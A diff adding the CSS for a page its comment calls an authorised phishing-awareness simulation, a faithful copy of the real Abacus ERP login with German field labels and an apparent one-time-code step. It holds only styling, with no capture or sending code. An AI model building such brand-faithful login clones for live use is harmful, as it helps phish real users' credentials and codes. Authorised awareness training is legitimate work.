@@ -1,0 +1,227 @@
+/* MyAbacus ESS sign-in — authorised phishing-awareness simulation.
+   Faithful single-page recreation of the real Abacus ERP OAuth login:
+   light-grey page, "Abacus ERP Login" + ABACUS logo row, centred white card
+   with Benutzername/Passwort and a blue "Anmelden" button (bottom-right),
+   plus a footer row (Check Newsletter / Hilfe / Deutsch language dropup).
+   Mobile-first and fully responsive. Bootstrap-default typography. */
+
+:root {
+  --aba-bg:        #f4f4f5;  /* page background */
+  --aba-card:      #ffffff;
+  --aba-ink:       #333333;
+  --aba-title:     #777777;  /* "Abacus ERP Login" grey */
+  --aba-heading:   #404040;  /* card "Bitte anmelden ..." */
+  --aba-label:     #3a5a78;  /* grey-blue field labels (text-primary-2) */
+  --aba-muted:     #6f6f6f;
+  --aba-line:      #cccccc;  /* input border */
+  --aba-card-line: #e7e7e7;  /* card border */
+  --aba-blue:      #2680c2;  /* btn-primary */
+  --aba-blue-dk:   #2069a0;
+  --aba-radius:    4px;
+}
+
+* { box-sizing: border-box; }
+
+html, body { min-height: 100%; }
+
+body {
+  margin: 0;
+  background: var(--aba-bg);
+  color: var(--aba-ink);
+  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+  font-size: 14px;
+  line-height: 1.42857143;
+  -webkit-font-smoothing: antialiased;
+}
+
+.login-container {
+  width: 100%;
+  max-width: 440px;
+  margin: 0 auto;
+  padding: 70px 16px 40px;
+}
+
+/* --- top row: "Abacus ERP Login" (left) + ABACUS logo (right) --- */
+.login-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  margin-bottom: 22px;
+  flex-wrap: wrap;
+}
+.login-title {
+  margin: 0;
+  font-size: 26px;
+  font-weight: 300;
+  color: var(--aba-title);
+  letter-spacing: .2px;
+}
+.login-logo {
+  display: block;
+  height: 26px;
+  width: auto;
+}
+
+/* --- white card --- */
+.hpanel {
+  background: var(--aba-card);
+  border: 1px solid var(--aba-card-line);
+  border-radius: var(--aba-radius);
+  box-shadow: 0 1px 3px rgba(0, 0, 0, .06);
+}
+.panel-body {
+  padding: 26px 24px 28px;
+}
+
+.login-please {
+  margin: 0 0 24px;
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--aba-heading);
+}
+
+.otp-hint {
+  margin: 0 0 20px;
+  font-size: 14px;
+  color: var(--aba-muted);
+}
+#email-echo-2 { color: var(--aba-ink); font-weight: 600; word-break: break-all; }
+
+/* --- form fields --- */
+.form-group { margin-bottom: 18px; }
+
+.control-label {
+  display: block;
+  margin-bottom: 5px;
+  font-size: 13px;
+  font-weight: 400;
+  color: var(--aba-label);
+}
+
+.form-control {
+  display: block;
+  width: 100%;
+  height: 38px;
+  padding: 7px 12px;
+  font-size: 14px;
+  color: var(--aba-ink);
+  background: #fff;
+  border: 1px solid var(--aba-line);
+  border-radius: var(--aba-radius);
+  appearance: none;
+  transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+}
+.form-control:focus {
+  outline: none;
+  border-color: var(--aba-blue);
+  box-shadow: 0 0 0 3px rgba(38, 128, 194, .18);
+}
+.form-control::placeholder { color: #aaa; }
+
+/* --- button row: button bottom-right --- */
+.form-actions {
+  display: flex;
+  justify-content: flex-end;
+  margin-top: 26px;
+}
+
+.btn {
+  display: inline-block;
+  min-height: 34px;
+  padding: 7px 18px;
+  font-size: 14px;
+  font-weight: 400;
+  line-height: 1.42857143;
+  text-align: center;
+  white-space: nowrap;
+  cursor: pointer;
+  border: 1px solid transparent;
+  border-radius: var(--aba-radius);
+  user-select: none;
+}
+.btn-primary {
+  color: #fff;
+  background: var(--aba-blue);
+  border-color: var(--aba-blue);
+}
+.btn-primary:hover  { background: var(--aba-blue-dk); border-color: var(--aba-blue-dk); }
+.btn-primary:active { background: #1a5d8f; }
+
+.btn-default {
+  color: #555;
+  background: #fff;
+  border-color: #cfcfcf;
+}
+.btn-default:hover { background: #f5f5f5; }
+
+/* --- footer row (under the card) --- */
+.language-bar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 16px;
+  margin-top: 18px;
+  flex-wrap: wrap;
+}
+.bar-left {
+  display: flex;
+  align-items: center;
+  gap: 24px;
+  flex-wrap: wrap;
+}
+.bar-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 14px;
+  color: #555;
+  text-decoration: none;
+}
+.bar-link:hover { text-decoration: none; color: #333; }
+.bar-icon {
+  width: 26px;
+  height: 26px;
+  display: block;
+}
+.bar-right { margin-left: auto; }
+
+.dropup-btn {
+  font-size: 12px;
+  padding: 5px 12px;
+  min-height: 30px;
+}
+.caret {
+  display: inline-block;
+  width: 0; height: 0;
+  margin-left: 4px;
+  vertical-align: middle;
+  border-left: 4px solid transparent;
+  border-right: 4px solid transparent;
+  border-bottom: 4px solid currentColor; /* dropup: arrow points up */
+}
+
+/* --- responsive: phone --- */
+@media (max-width: 600px) {
+  .login-container { padding: 28px 12px 32px; max-width: 100%; }
+  .login-head {
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+    text-align: center;
+  }
+  .login-title { font-size: 23px; }
+  .panel-body { padding: 22px 18px 24px; }
+  .form-control { height: 42px; }            /* larger tap targets */
+  .btn { min-height: 42px; padding: 10px 20px; }
+  .form-actions .btn-primary { width: 100%; }
+  .language-bar {
+    flex-direction: column;
+    align-items: stretch;
+    gap: 14px;
+  }
+  .bar-left { justify-content: center; gap: 20px; }
+  .bar-right { margin-left: 0; text-align: center; }
+  .bar-link { min-height: 40px; }
+  .dropup-btn { width: 100%; min-height: 40px; }
+}
